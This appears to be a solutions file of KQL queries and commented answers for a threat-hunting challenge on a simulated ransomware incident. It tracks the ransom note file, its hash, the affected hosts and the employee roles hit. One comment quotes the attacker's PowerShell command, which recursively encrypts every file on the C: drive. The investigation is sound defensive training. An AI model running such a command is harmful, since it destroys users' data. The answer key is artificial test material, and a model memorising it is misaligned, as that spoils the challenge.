  | where username contains "anbartlett"
  | where timestamp  >= datetime("2023-08-10T16:20:55")
  | take 10
 // powershell.exe -c "Get-ChildItem C:\ -File -Recurse | Foreach-Object { $_.FullName } | ForEach-Object { Encrypt-File $_ }"
//2023-08-10T17:06:59.000Z

//In what kind of attack does an adversary encrypt a victim's files?
//ransomware

//Let's see if any suspicious files were created around the time the encryption command was executed.
//There is! It appears to be a note…
//What is the name of this file?

FileCreationEvents
  | where timestamp  >= datetime("2023-08-10T17:06:59")
  | take 10 //GIVE_US_YOUR_BITCOIN.txt

//What is the SHA256 hash of this file?
//1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669

//On how many unique hosts was this file seen?

FileCreationEvents
| where filename contains "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname //80

//On what date was this file seen in our environment?
FileCreationEvents
| where filename contains "GIVE_US_YOUR_BITCOIN.txt"
| summarize FirstSeen = min(timestamp) by filename
//2023-08-10

//Let's look at all the affected hosts. How many different employee roles were affected by this?

let affected_hosts =
FileCreationEvents
| where filename contains "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname;
Employees
  | where hostname in (affected_hosts)
  | distinct role //9 
//Marketing Associate; Domination Minion; Cybersecurity Analyst; Associate Consultant; Sales Associate;Life Hacker;Human Resources Analyst;Director of Operations;IT Analyst

//Which employee role was most affected by the ransomware attack?
let affected_hosts =
FileCreationEvents
| where filename contains "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname;
Employees
  | where hostname in (affected_hosts)
  | summarize RoleCount = dcount(hostname) by role
  //Domination Minion

//One IT analyst was affected. What is this employee's name?
let affected_hosts =
FileCreationEvents
| where filename contains "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname;
Employees
  | where hostname in (affected_hosts)
  | where role contains "IT Analyst"
  //Walter Gomez


